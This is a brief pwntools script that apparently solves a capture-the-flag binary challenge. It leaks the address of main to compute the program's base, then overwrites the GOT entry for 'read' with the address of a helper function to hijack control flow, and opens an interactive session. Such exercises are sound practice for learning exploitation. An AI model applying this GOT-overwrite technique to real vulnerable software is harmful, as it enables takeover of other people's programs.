from pwn import *

ex = "./challenge"
elf = ELF(ex)
p = process(ex)

main_address = p.unpack()

elf.address = main_address - elf.symbols['main']

# p.sendline(str(elf.got["read"]))
# p.sendline(str(elf.symbols["oh_look_useful"]))

p.pack(elf.got["read"])
p.pack(elf.symbols["oh_look_useful"])

p.interactive()
	